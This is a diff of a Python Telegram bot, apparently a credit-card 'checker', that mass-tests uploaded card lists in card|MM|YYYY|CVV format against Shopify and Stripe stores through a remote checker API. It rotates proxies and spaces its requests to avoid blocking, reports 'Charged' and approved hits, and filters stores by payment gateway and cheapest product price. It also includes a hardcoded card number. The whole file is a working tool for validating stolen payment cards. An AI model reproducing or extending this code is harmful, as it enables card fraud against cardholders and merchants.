@@ -455,10 +455,11 @@ def get_user_stats_text(user_id, username):
     text += f"💡 Made by: @ISoonik"
     return text
 
-# ==================== دوال فحص المواقع ====================
+# ==================== دوال فحص المواقع (المعدلة) ====================
 ALLOWED_GATEWAYS = ['shopify payments', 'shopify', 'shopify_payments', 'stripe']
 
-def test_site(site, proxy):
+def test_site_with_proxy(site, proxy):
+    """اختبار موقع باستخدام بروكسي معين"""
     test_card = "4031630422575208|01|2030|280"
     try:
         if site.startswith('https://') or site.startswith('http://'):
@@ -468,16 +469,65 @@ def test_site(site, proxy):
             url += f'&proxy={proxy}'
         response = requests.get(url, timeout=30)
         if response.status_code != 200:
-            return {'site': site, 'status': 'dead'}
+            return {'site': site, 'status': 'dead', 'reason': f'HTTP {response.status_code}'}
         raw = response.json()
-        if raw.get('Status', False):
-            return {'site': site, 'status': 'alive'}
+        # التحقق من أن الاستجابة تحتوي على Response
+        if raw.get('Response') or raw.get('Status'):
+            return {'site': site, 'status': 'alive', 'reason': 'OK'}
         else:
-            return {'site': site, 'status': 'dead'}
-    except:
-        return {'site': site, 'status': 'dead'}
+            return {'site': site, 'status': 'dead', 'reason': 'Invalid response'}
+    except Exception as e:
+        return {'site': site, 'status': 'dead', 'reason': str(e)[:50]}
+
+def check_all_sites_with_filter(user_id, sites, price_range, message_id):
+    """فحص جميع المواقع وتصفيتها حسب السعر والـ Gateway"""
+    proxies = load_user_proxies(user_id)
+    if not proxies:
+        bot.edit_message_text("❌ No proxies available.", chat_id=user_id, message_id=message_id, parse_mode='HTML')
+        return []
+    
+    total = len(sites)
+    valid_sites = []
+    invalid_sites = []
+    
+    bot.edit_message_text(f"🔄 Checking {total} sites...\nPrice filter: {price_range['name']}\n\n⏳ Please wait...", chat_id=user_id, message_id=message_id, parse_mode='HTML')
+    
+    for i, site in enumerate(sites):
+        proxy = random.choice(proxies)
+        
+        # 1. اختبار الموقع
+        test_result = test_site_with_proxy(site, proxy)
+        
+        if test_result['status'] != 'alive':
+            invalid_sites.append({'site': site, 'reason': test_result['reason']})
+            continue
+        
+        # 2. التحقق من الـ Gateway
+        gateway = get_site_gateway(site, proxy)
+        if not gateway or not any(allowed in gateway.lower() for allowed in ALLOWED_GATEWAYS):
+            invalid_sites.append({'site': site, 'reason': f'Gateway: {gateway or "Unknown"}'})
+            continue
+        
+        # 3. التحقق من السعر إذا كان مطلوباً
+        if price_range["min"] > 0 or price_range["max"] < 999999:
+            min_price = get_site_min_price(site)
+            if min_price is None:
+                invalid_sites.append({'site': site, 'reason': 'No products found'})
+                continue
+            if min_price > price_range["max"]:
+                invalid_sites.append({'site': site, 'reason': f'Min price ${min_price:.2f} > ${price_range["max"]}'})
+                continue
+        
+        valid_sites.append(site)
+        
+        # تحديث التقدم كل 5 مواقع
+        if (i + 1) % 5 == 0 or (i + 1) == total:
+            bot.edit_message_text(f"🔄 Progress: {i+1}/{total}\n✅ Valid: {len(valid_sites)}\n❌ Invalid: {len(invalid_sites)}\n\nPrice filter: {price_range['name']}", chat_id=user_id, message_id=message_id, parse_mode='HTML')
+    
+    return valid_sites, invalid_sites
 
 def get_site_gateway(site, proxy):
+    """الحصول على Gateway الموقع"""
     test_card = "4031630422575208|01|2030|280"
     try:
         if site.startswith('https://') or site.startswith('http://'):
@@ -495,6 +545,7 @@ def get_site_gateway(site, proxy):
         return None
 
 def get_site_min_price(site):
+    """الحصول على أقل سعر منتج في الموقع"""
     try:
         if site.startswith('https://') or site.startswith('http://'):
             site = site.replace('https://', '').replace('http://', '').rstrip('/')
@@ -972,7 +1023,7 @@ Country: {country} {flag}</pre>
     except Exception as e:
         bot.edit_message_text(f"❌ Error checking card: {e}", chat_id=message.chat.id, message_id=msg.message_id)
 
-# ==================== فحص جماعي (كومبو) - النسخة المعدلة ====================
+# ==================== فحص جماعي (كومبو) ====================
 @bot.message_handler(commands=['chk'])
 def mass_check_command(message):
     user_id = message.from_user.id
@@ -980,12 +1031,10 @@ def mass_check_command(message):
         bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
         return
     
-    # التحقق من وجود فحص نشط
     if user_id in active_scans and active_scans.get(user_id, {}).get("active", False):
         bot.reply_to(message, "⏳ <b>You already have a check in progress. Wait until it completes.</b>", parse_mode='HTML')
         return
     
-    # طلب الملف
     bot.reply_to(message, "📁 <b>Please send the .txt file containing cards.</b>\n\nFormat: <code>card|MM|YYYY|CVV</code> (one per line)\n\nSend /cancel to cancel.", parse_mode='HTML')
     bot.register_next_step_handler(message, process_mass_file, user_id)
 
@@ -1022,7 +1071,6 @@ def process_mass_file(message, user_id):
             bot.reply_to(message, "❌ No proxies available. Add proxies first.")
             return
         
-        # التحقق من عدد الفحوصات للمستخدم العادي
         if not is_admin(user_id):
             checks_left = get_user_checks_left(user_id)
             if len(cards) > checks_left:
@@ -1034,7 +1082,6 @@ def process_mass_file(message, user_id):
             bot.reply_to(message, f"⚠️ File contains {len(cards)} cards. Limiting to first {max_cards} cards.", parse_mode='HTML')
             cards = cards[:max_cards]
         
-        # حفظ البيانات مؤقتاً وطلب اختيار الوضع
         user_pending_mass[user_id] = {
             'cards': cards,
             'sites': sites,
@@ -1070,11 +1117,9 @@ def handle_mode_selection(call):
     proxies = pending['proxies']
     total_cards = pending['total']
     
-    # رسالة بداية الفحص
     msg = bot.edit_message_text(f"🔄 Starting check for {total_cards} cards...\nMode: {'CHARGES ONLY' if mode == 'charges_only' else 'ALL HITS'}", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
     bot.answer_callback_query(call.id)
     
-    # بدء الفحص في thread منفصل
     thread = threading.Thread(target=run_mass_check, args=(user_id, cards, sites, proxies, mode, msg.message_id))
     thread.start()
 
@@ -1093,20 +1138,16 @@ def run_mass_check(user_id, cards, sites, proxies, mode, message_id):
     card_responses = []
     
     for i, card in enumerate(cards):
-        # التحقق من طلب الإيقاف
         if not active_scans.get(user_id, {}).get("active", False) or active_scans.get(user_id, {}).get("stop_requested", False):
             bot.edit_message_text("🛑 <b>Mass check stopped by user.</b>", chat_id=user_id, message_id=message_id, parse_mode='HTML')
             break
         
-        # فحص البطاقة
         res = check_card_with_retry(card, sites, proxies, max_retries=1)
         all_results['checked'] += 1
         
-        # تحديث عدد الفحوصات للمستخدم العادي
         if not is_admin(user_id):
             increment_user_checks(user_id, 1)
         
-        # تخزين النتيجة
         card_responses.append({
             'card': card,
             'status': res['status'],
@@ -1115,7 +1156,6 @@ def run_mass_check(user_id, cards, sites, proxies, mode, message_id):
             'gateway': res.get('gateway', 'Unknown')
         })
         
-        # إرسال Hit حسب الوضع
         if res['status'] == 'Charged':
             all_results['charged'].append(res)
             send_hit_message(user_id, res, 'Charged')
@@ -1127,7 +1167,6 @@ def run_mass_check(user_id, cards, sites, proxies, mode, message_id):
         else:
             all_results['dead'].append(res)
         
-        # تحديث واجهة التقدم
         elapsed = int(time.time() - all_results['start_time'])
         hours = elapsed // 3600
         minutes = (elapsed % 3600) // 60
@@ -1135,7 +1174,6 @@ def run_mass_check(user_id, cards, sites, proxies, mode, message_id):
         
         gateway = all_results['charged'][0]['gateway'] if all_results['charged'] else (all_results['approved'][0]['gateway'] if all_results['approved'] else 'Unknown')
         
-        # عرض آخر 5 نتائج
         recent_responses = ""
         for cr in card_responses[-5:]:
             if cr['status'] == 'Charged':
@@ -1163,10 +1201,8 @@ def run_mass_check(user_id, cards, sites, proxies, mode, message_id):
         except:
             pass
         
-        # تأخير بين الفحوصات لتجنب الحظر
         time.sleep(random.uniform(0.8, 1.2))
     
-    # إرسال النتائج النهائية
     elapsed = int(time.time() - all_results['start_time'])
     hours = elapsed // 3600
     minutes = (elapsed % 3600) // 60
@@ -1198,7 +1234,6 @@ def run_mass_check(user_id, cards, sites, proxies, mode, message_id):
     
     bot.edit_message_text(summary, chat_id=user_id, message_id=message_id, parse_mode='HTML')
     
-    # تنظيف الفحص النشط
     if user_id in active_scans:
         del active_scans[user_id]
 
@@ -1285,7 +1320,7 @@ def broadcast_command(message):
             time.sleep(0.2)
         except:
             failed += 1
-    bot.send_message(admin, f"✅ <b>Broadcast Complete!</b>\n✅ Sent: {sent}\n❌ Failed: {failed}", parse_mode='HTML')
+    bot.send_message(user_id, f"✅ <b>Broadcast Complete!</b>\n✅ Sent: {sent}\n❌ Failed: {failed}", parse_mode='HTML')
 
 @bot.message_handler(commands=['setlimit'])
 def setlimit_command(message):
@@ -1429,7 +1464,7 @@ def redeem_command(message):
     else:
         bot.reply_to(message, f"❌ <b>Activation Failed!</b>\n\n{msg}", parse_mode='HTML')
 
-# ==================== أوامر إدارة المواقع للأدمن ====================
+# ==================== أوامر إدارة المواقع للأدمن (المعدلة) ====================
 @bot.message_handler(commands=['mysites'])
 def mysites_command(message):
     user_id = message.from_user.id
@@ -1461,17 +1496,22 @@ def add_site_command(message):
         return
     msg = bot.reply_to(message, f"🔄 Testing site: {site}...", parse_mode='HTML')
     proxy = random.choice(proxies)
-    result = test_site(site, proxy)
-    if result['status'] == 'alive':
+    test_result = test_site_with_proxy(site, proxy)
+    if test_result['status'] == 'alive':
         current_sites = load_admin_sites()
         if site not in current_sites:
-            new_sites = current_sites + [site]
-            save_admin_sites(new_sites)
-            bot.edit_message_text(f"✅ <b>Site added successfully!</b>\n\n{site}", chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')
+            # التحقق من الـ Gateway
+            gateway = get_site_gateway(site, proxy)
+            if gateway and any(allowed in gateway.lower() for allowed in ALLOWED_GATEWAYS):
+                new_sites = current_sites + [site]
+                save_admin_sites(new_sites)
+                bot.edit_message_text(f"✅ <b>Site added successfully!</b>\n\n{site}\nGateway: {gateway}", chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')
+            else:
+                bot.edit_message_text(f"⚠️ <b>Site added but gateway not supported!</b>\n\n{site}\nGateway: {gateway or 'Unknown'}\nOnly Shopify/Stripe sites work.", chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')
         else:
             bot.edit_message_text(f"⚠️ <b>Site already exists:</b> {site}", chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')
     else:
-        bot.edit_message_text(f"❌ <b>Could not add site!</b>\n\nSite appears to be dead or unreachable.", chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')
+        bot.edit_message_text(f"❌ <b>Could not add site!</b>\n\nSite appears to be dead or unreachable.\nReason: {test_result['reason']}", chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')
 
 @bot.message_handler(commands=['rmsite'])
 def rmsite_command(message):
@@ -1515,10 +1555,6 @@ def sitecheck_command(message):
     if not sites:
         bot.reply_to(message, "❌ No sites to check.")
         return
-    proxies = load_user_proxies(user_id)
-    if not proxies:
-        bot.reply_to(message, "❌ No proxies available.")
-        return
     user_pending_sites[user_id] = {
         'action': 'check',
         'sites': sites,
@@ -1526,29 +1562,42 @@ def sitecheck_command(message):
     }
     bot.reply_to(message, "💰 <b>Select price range to filter sites:</b>\n\nSites with cheapest product above selected range will be removed.", reply_markup=get_price_filter_keyboard(), parse_mode='HTML')
 
-@bot.message_handler(commands=['addsites'], content_types=['document'])
-def addsites_file_command(message):
+@bot.message_handler(content_types=['document'])
+def handle_document(message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        return
+    
+    if message.document and message.document.file_name.endswith('.txt'):
+        # تخزين مؤقت لملف المواقع
+        try:
+            file_info = bot.get_file(message.document.file_id)
+            downloaded_file = bot.download_file(file_info.file_path)
+            content = downloaded_file.decode('utf-8')
+            sites = [line.strip() for line in content.split('\n') if line.strip()]
+            sites = [s.replace('https://', '').replace('http://', '').rstrip('/') for s in sites]
+            
+            if not sites:
+                bot.reply_to(message, "❌ No valid sites found in file.")
+                return
+            
+            user_pending_sites[user_id] = {
+                'action': 'add',
+                'sites': sites,
+                'expires': time.time() + 300
+            }
+            bot.reply_to(message, f"💰 <b>Select price range to filter sites:</b>\n\n{len(sites)} sites found.\nSites with cheapest product above selected range will be removed.\n\nYou have 5 minutes to select.", reply_markup=get_price_filter_keyboard(), parse_mode='HTML')
+        except Exception as e:
+            bot.reply_to(message, f"❌ Error processing file: {e}")
+
+# أمر /addsites - يعمل مع الملفات
+@bot.message_handler(commands=['addsites'])
+def addsites_command(message):
     user_id = message.from_user.id
     if not is_admin(user_id):
         bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
         return
-    if not message.document or not message.document.file_name.endswith('.txt'):
-        bot.reply_to(message, "❌ Reply to a .txt file containing sites.")
-        return
-    file_info = bot.get_file(message.document.file_id)
-    downloaded_file = bot.download_file(file_info.file_path)
-    content = downloaded_file.decode('utf-8')
-    sites = [line.strip() for line in content.split('\n') if line.strip()]
-    sites = [s.replace('https://', '').replace('http://', '').rstrip('/') for s in sites]
-    if not sites:
-        bot.reply_to(message, "❌ No valid sites found in file.")
-        return
-    user_pending_sites[user_id] = {
-        'action': 'add',
-        'sites': sites,
-        'expires': time.time() + 300
-    }
-    bot.reply_to(message, f"💰 <b>Select price range to filter sites:</b>\n\n{len(sites)} sites found.\nSites with cheapest product above selected range will be removed.\n\nYou have 5 minutes to select.", reply_markup=get_price_filter_keyboard(), parse_mode='HTML')
+    bot.reply_to(message, "📁 <b>Send me a .txt file containing sites (one per line).</b>\n\nExample:\n<code>example.com\nshop.com\nstore.com</code>\n\nSend /cancel to cancel.", parse_mode='HTML')
 
 # ==================== معالجة أزرار الكولباك ====================
 @bot.callback_query_handler(func=lambda call: True)
@@ -1708,6 +1757,16 @@ Use buttons below or direct commands:
         bot.answer_callback_query(call.id)
     
     elif data == "admin_check_sites" and is_admin(user_id):
+        sites = load_admin_sites()
+        if not sites:
+            bot.edit_message_text("❌ No sites to check.", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
+            bot.answer_callback_query(call.id)
+            return
+        user_pending_sites[user_id] = {
+            'action': 'check',
+            'sites': sites,
+            'expires': time.time() + 300
+        }
         bot.edit_message_text("💰 <b>Select price range to filter sites:</b>\n\nSites will be filtered by their cheapest product price.", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=get_price_filter_keyboard(), parse_mode='HTML')
         bot.answer_callback_query(call.id)
     
@@ -1739,57 +1798,49 @@ Use buttons below or direct commands:
                 "4": {"name": "No filter", "min": 0, "max": 999999}
             }
             price_range = price_ranges.get(price_key, price_ranges["4"])
-            bot.edit_message_text(f"🔄 Processing {len(sites)} sites...\nPrice filter: {price_range['name']}", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
-            proxies = load_user_proxies(user_id)
-            if not proxies:
-                bot.edit_message_text("❌ No proxies available.", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
-                bot.answer_callback_query(call.id)
-                return
-            proxy = random.choice(proxies)
-            filtered_sites = []
-            total = len(sites)
-            for i, site in enumerate(sites):
-                gateway = get_site_gateway(site, proxy)
-                if not gateway or not any(allowed in gateway for allowed in ALLOWED_GATEWAYS):
-                    continue
-                if price_range["min"] > 0 or price_range["max"] < 999999:
-                    min_price = get_site_min_price(site)
-                    if min_price is None or min_price <= price_range["max"]:
-                        filtered_sites.append(site)
-                else:
-                    filtered_sites.append(site)
-                if (i + 1) % 10 == 0:
-                    bot.edit_message_text(f"🔄 Progress: {i+1}/{total}\nValid sites: {len(filtered_sites)}", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
+            
+            # فحص المواقع
+            valid_sites, invalid_sites = check_all_sites_with_filter(user_id, sites, price_range, call.message.message_id)
+            
             if action == 'check':
-                save_admin_sites(filtered_sites)
+                save_admin_sites(valid_sites)
                 result_text = f"""✅ <b>Site Check Complete!</b>
 
 📊 <b>Summary:</b>
 ├ Total sites before: {len(sites)}
-├ Sites after filter: {len(filtered_sites)}
-├ Removed: {len(sites) - len(filtered_sites)}
+├ ✅ Valid sites: {len(valid_sites)}
+├ ❌ Invalid sites: {len(invalid_sites)}
 
 💰 <b>Filter applied:</b> {price_range['name']}
 🔌 <b>Gateway filter:</b> Shopify/Stripe only
 
-Sites have been updated with only working sites."""
+Sites have been updated with only valid sites."""
+                
+                # عرض بعض المواقع غير الصالحة
+                if invalid_sites:
+                    result_text += f"\n\n<b>❌ Removed sites (first 10):</b>\n"
+                    for inv in invalid_sites[:10]:
+                        result_text += f"• {inv['site']} - {inv['reason']}\n"
+                    if len(invalid_sites) > 10:
+                        result_text += f"• ... and {len(invalid_sites) - 10} more"
             else:
                 current_sites = load_admin_sites()
-                new_sites = [s for s in filtered_sites if s not in current_sites]
-                all_sites = list(set(current_sites + filtered_sites))
+                new_sites = [s for s in valid_sites if s not in current_sites]
+                all_sites = list(set(current_sites + valid_sites))
                 save_admin_sites(all_sites)
                 result_text = f"""✅ <b>Sites Added with Filters!</b>
 
 📊 <b>Summary:</b>
 ├ Total sites in file: {len(sites)}
-├ Valid sites (Shopify/Stripe): {len(filtered_sites)}
-├ New sites added: {len(new_sites)}
-└ Total sites now: {len(all_sites)}
+├ ✅ Valid sites (Shopify/Stripe): {len(valid_sites)}
+├ 📝 New sites added: {len(new_sites)}
+└ 🌐 Total sites now: {len(all_sites)}
 
 💰 <b>Filter applied:</b> {price_range['name']}
 🔌 <b>Gateway filter:</b> Shopify/Stripe only
 
 Use /sitecheck to verify all sites are working."""
+            
             bot.edit_message_text(result_text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
             bot.answer_callback_query(call.id)
     
@@ -1804,7 +1855,7 @@ Use /sitecheck to verify all sites are working."""
 if __name__ == "__main__":
     print("=" * 50)
     print("✅ SONIC BOT started successfully!")
-    print("⚡ SONIC BOT (Telebot Version)")
+    print("⚡ SONIC BOT (Telebot Version) - FIXED")
     print(f"📡 API URL: {CHECKER_API_URL}")
     print("=" * 50)
     while True:
